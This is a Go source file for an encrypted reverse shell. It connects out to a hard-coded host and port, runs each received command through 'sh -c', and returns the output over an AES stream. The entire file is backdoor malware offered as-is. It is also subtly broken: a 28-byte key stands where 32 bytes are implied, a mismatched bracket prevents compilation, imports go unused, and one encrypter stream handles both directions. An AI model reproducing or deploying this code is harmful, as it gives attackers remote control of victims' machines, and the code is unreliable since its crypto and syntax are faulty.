package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os/exec"
)

const LHOST = "192.168.1.100"
const LPORT = "4448"
const KEY = "32-byte-long-key-here-123456"

func main() {
	conn, err := net.Dial("tcp", LHOST+":"+LPORT)
	if err != nil {
		return
	}
	defer conn.Close()

	block, err := aes.NewCipher([]byte(KEY))
	if err != nil {
		return
	}

	stream := cipher.NewCFBEncrypter(block, []byte(KEY)[:aes.BlockSize))
	writer := &cipher.StreamWriter{S: stream, W: conn}

	for {
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		if err != nil {
			break
		}

		decrypted := make([]byte, n)
		stream.XORKeyStream(decrypted, buf[:n])

		if string(decrypted) == "exit\n" {
			break
		}

		cmd := exec.Command("sh", "-c", string(decrypted))
		output, err := cmd.CombinedOutput()
		if err != nil {
			output = []byte(err.Error())
		}

		encrypted := make([]byte, len(output))
		stream.XORKeyStream(encrypted, output)
		writer.Write(encrypted)
	}
}
